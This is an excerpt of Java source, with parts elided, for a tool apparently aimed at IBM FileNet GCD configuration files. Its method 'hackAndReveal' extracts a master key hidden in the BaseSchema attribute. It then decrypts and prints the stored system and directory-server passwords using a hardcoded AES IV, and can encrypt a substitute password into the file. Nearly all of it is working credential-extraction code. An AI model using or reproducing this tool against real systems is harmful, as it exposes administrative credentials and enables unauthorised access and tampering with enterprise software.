...
public class GCDConfigImpl implements GCDConfig {
    ...
    private static final byte[] STATIC_IV = "Mike Seaman OK!!".getBytes(StandardCharsets.US_ASCII); // lol IV is hardcoded in engine.jar com.filenet.engine.context.DomainContext. Hello Mike
    ...
    public void hackAndReveal(String newPasswordToEncrypt) {
        ...
        //Master key hidden with steganography in sql request
        String baseSchema = findAttributeValue(xmlContent, "BaseSchema", "string");
        byte[] masterKey = null;
        if (baseSchema != null) {
            try {
                System.out.println("Found BaseSchema... Attempting to extract hidden key...");
        ...
        if (masterKey != null) {
            decryptAndPrint(xmlContent, "SystemPassword", masterKey);
            decryptAndPrint(xmlContent, "DirectoryServerPassword", masterKey);
            //if you need to change encrypted pass in xml
            if (newPasswordToEncrypt != null && !newPasswordToEncrypt.isEmpty()) {
                System.out.println("\n>>> ENCRYPTING NEW PASSWORD <<<");
                System.out.println("Input: " + newPasswordToEncrypt);
                String newBlob = encrypt(newPasswordToEncrypt, masterKey);
    ...
    private String findAttributeValue(String xml, String attrName, String type) {
        Pattern pAttr = Pattern.compile("<attribute[^>]*name=\"" + attrName + "\"[^>]*>.*?<value[^>]*" + type + "=\"([^\"]+)\"", Pattern.DOTALL);
    ...
    private void decryptAndPrint(String xml, String attrName, byte[] key) {
        String hexBlob = findAttributeValue(xml, attrName, "blob");
        if (hexBlob != null) {
            String pass = decrypt(hexBlob, key);
    ...
    private String decrypt(String hexData, byte[] key) {
        try {
            byte[] encrypted = hexStringToByteArray(hexData);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(STATIC_IV));
    ...
    private String encrypt(String password, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(STATIC_IV));
